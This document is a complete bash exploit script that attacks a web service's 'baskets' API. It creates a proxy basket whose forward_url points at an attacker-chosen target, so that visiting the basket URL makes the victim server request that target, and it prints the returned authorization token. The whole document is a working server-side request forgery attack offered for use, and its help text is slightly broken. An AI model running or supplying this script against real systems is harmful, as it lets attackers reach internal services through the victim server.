#!/bin/bash


if [ "$#" -lt 2 ] || [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
    help="Usage: exploit.sh <URL> <TARGET>\n\n";
    help+="Arguments:\n" \
    help+=" URL            main path (/) of the server (eg. http://127.0.0.1:5000/)\n";
    help+=" TARGET";

    echo -e "$help";
    exit 1;
fi

URL=$1
ATTACKER_SERVER=$2

if [ "${URL: -1}" != "/" ]; then
    URL="$URL/";
fi;

BASKET_NAME=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c "6");

API_URL="$URL""api/baskets/$BASKET_NAME";

PAYLOAD="{\"forward_url\": \"$ATTACKER_SERVER\",\"proxy_response\": true,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}";

echo "> Creating the \"$BASKET_NAME\" proxy basket...";

if ! response=$(curl -s -X POST -H 'Content-Type: application/json' -d "$PAYLOAD" "$API_URL"); then
    echo "> FATAL: Could not properly request $API_URL. Is the server online?";
    exit 1;
fi;

BASKET_URL="$URL$BASKET_NAME";

echo "> Basket created!";
echo "> Accessing $BASKET_URL now makes the server request to $ATTACKER_SERVER.";

if ! jq --help 1>/dev/null; then
    echo "> Response body (Authorization): $response";
else
    echo "> Authorization: $(echo "$response" | jq -r ".token")";
fi;

exit 0;